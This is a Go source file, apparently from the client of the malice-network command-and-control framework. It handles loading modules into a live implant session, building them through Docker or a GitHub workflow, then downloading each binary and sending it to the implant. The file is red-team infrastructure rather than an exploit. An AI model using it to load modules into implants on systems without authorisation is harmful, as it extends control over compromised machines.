package modules

import (
	"errors"
	"fmt"
	"github.com/chainreactors/malice-network/client/assets"
	"github.com/chainreactors/malice-network/client/command/build"
	"github.com/chainreactors/malice-network/client/core"
	"github.com/chainreactors/malice-network/client/repl"
	"github.com/chainreactors/malice-network/helper/consts"
	"github.com/chainreactors/malice-network/helper/proto/client/clientpb"
	"github.com/chainreactors/malice-network/helper/proto/implant/implantpb"
	"github.com/chainreactors/malice-network/helper/proto/services/clientrpc"
	"github.com/spf13/cobra"
	"os"
	"path/filepath"
	"time"
)

func LoadModuleCmd(cmd *cobra.Command, con *repl.Console) error {
	bundle, _ := cmd.Flags().GetString("bundle")
	path, _ := cmd.Flags().GetString("path")
	modules, _ := cmd.Flags().GetStringSlice("modules")
	builderResource, _ := cmd.Flags().GetString("build")
	target, _ := cmd.Flags().GetString("target")
	profile, _ := cmd.Flags().GetString("profile")

	// Validate required flags
	if builderResource != "" && (target == "" || profile == "") {
		return errors.New("require build module target and profile")
	}
	if path == "" && len(modules) == 0 {
		return errors.New("path or modules is required")
	}

	if len(modules) > 0 && path == "" {
		return handleModuleBuild(con, builderResource, target, profile, modules)
	}

	// Default bundle handling
	if bundle == "" {
		bundle = filepath.Base(path)
	}
	session := con.GetInteractive()
	task, err := LoadModule(con.Rpc, session, bundle, path)
	if err != nil {
		return err
	}
	session.Console(task, fmt.Sprintf("load %s %s", bundle, path))
	return nil
}

// handleModuleBuild handles module build based on the builder resource (docker/action)
func handleModuleBuild(con *repl.Console, builderResource, target, profile string, modules []string) error {
	switch builderResource {
	case "docker":
		return buildWithDocker(con, target, profile, modules)
	case "action":
		return buildWithAction(con, target, profile, modules)
	default:
		return errors.New("unknown builder resource")
	}
}

// buildWithDocker handles module build via Docker
func buildWithDocker(con *repl.Console, target, profile string, modules []string) error {
	var modulePath string
	go func() {
		builder, err := con.Rpc.Build(con.Context(), &clientpb.BuildConfig{
			Target:      target,
			Modules:     modules,
			ProfileName: profile,
			Type:        consts.CommandBuildModules,
			Resource:    consts.ArtifactFromDocker,
		})
		if err != nil {
			con.Log.Errorf("Build modules failed: %v", err)
			return
		}
		modulePath, err = handleModuleDownload(con, builder.Id, builder.Name, builder.Bin)
		if err != nil {
			con.Log.Errorf("Write modules failed: %v\n", err)
			return
		}

		task, err := LoadModule(con.Rpc, con.GetInteractive(), builder.Name, modulePath)
		if err != nil {
			con.Log.Errorf("Load modules failed: %v\n", err)
			return
		}
		con.GetInteractive().Console(task, fmt.Sprintf("load %s %s", modules, modulePath))
	}()
	return nil
}

// buildWithAction handles module build via Action (GitHub workflow)
func buildWithAction(con *repl.Console, target, profile string, modules []string) error {
	if len(modules) == 0 {
		modules = []string{"full"}
	}
	go func() {
		builder, err := build.RunSaas(con, &clientpb.BuildConfig{
			Target:      "x86_64-pc-windows-msvc",
			Type:        consts.CommandBuildModules,
			Modules:     modules,
			Srdi:        false,
			ProfileName: profile,
			Resource:    consts.ArtifactFromSaas,
		})
		if err != nil {
			con.Log.Errorf("Run workflow failed: %v", err)
			return
		}
		modulePath, err := handleModuleDownload(con, builder.Id, builder.Name, builder.Bin)
		if err != nil {
			con.Log.Errorf("Write modules failed: %v\n", err)
			return
		}

		task, err := LoadModule(con.Rpc, con.GetInteractive(), builder.Name, modulePath)
		if err != nil {
			con.Log.Errorf("Load modules failed: %v\n", err)
			return
		}
		con.GetInteractive().Console(task, fmt.Sprintf("load %s %s\n", modules, modulePath))
	}()
	return nil
}

// handleModuleDownload handles module download and saves to disk
func handleModuleDownload(con *repl.Console, moduleID uint32, moduleName string, moduleBin []byte) (string, error) {
	var modulePath string
	if len(moduleBin) > 0 {
		modulePath = filepath.Join(assets.GetTempDir(), moduleName)
		err := os.WriteFile(modulePath, moduleBin, 0666)
		if err != nil {
			return "", err
		}
	} else {
		for {
			time.Sleep(30 * time.Second)
			builder, err := con.Rpc.DownloadArtifact(con.Context(), &clientpb.Artifact{
				Id: moduleID,
			})
			if err == nil {
				modulePath = filepath.Join(assets.GetTempDir(), builder.Name)
				err = os.WriteFile(modulePath, builder.Bin, 0666)
				if err != nil {
					return "", err
				}
				break
			}
		}
	}
	return modulePath, nil
}

func LoadModule(rpc clientrpc.MaliceRPCClient, session *core.Session, bundle string, path string) (*clientpb.Task, error) {
	data, err := os.ReadFile(path)
	if err != nil {
		return nil, err
	}
	task, err := rpc.LoadModule(session.Context(), &implantpb.LoadModule{
		Bundle: bundle,
		Bin:    data,
	})

	if err != nil {
		return nil, err
	}
	return task, nil
}
